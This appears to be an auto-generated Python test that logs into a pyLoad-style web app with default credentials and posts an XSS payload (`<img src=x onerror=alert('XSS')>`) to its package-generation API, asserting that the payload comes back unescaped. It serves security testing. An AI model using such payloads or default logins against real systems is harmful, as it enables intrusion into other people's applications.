    # Calls:
    # (200) POST:/api/generate_packages
    # Found 1 potential fault of type-code 201
    @timeout_decorator.timeout(60)
    def test_44_post_on_generate_packages_vulnerableToXSS(self):
        
        headers = {}
        headers["content-type"] = "application/x-www-form-urlencoded"
        body = "username=pyload&password=pyload"
        cookies_pyload_jar = requests \
                .post(self.baseUrlOfSut + "/login", 
                    headers=headers, data=body, allow_redirects=False, verify=False).cookies
        cookies_pyload = requests.utils.dict_from_cookiejar(cookies_pyload_jar)
        
        
        # Fault201. Cross-Site Scripting (XSS).
        headers = {}
        headers["content-type"] = "application/json"
        body = {}
        body = " { " + \
            " \"links\" : [ \"<img src=x onerror=alert('XSS')>\", \"<img src=x onerror=alert('XSS')>\" ] " + \
            " } "
        headers['Accept'] = "application/json"
        res_0 = requests \
                .post(self.baseUrlOfSut + "/api/generate_packages",
                    headers=headers, cookies=cookies_pyload, data=body, timeout=EM_HTTP_TIMEOUT_S, verify=False)
        
        assert res_0.status_code == 200
        assert "application/json" in res_0.headers["content-type"]
        assert len(res_0.json()["unknown"]) == 2
        assert res_0.json()["unknown"][0] == "<img src=x onerror=alert('XSS')>"
        assert res_0.json()["unknown"][1] == "<img src=x onerror=alert('XSS')>"
    
    
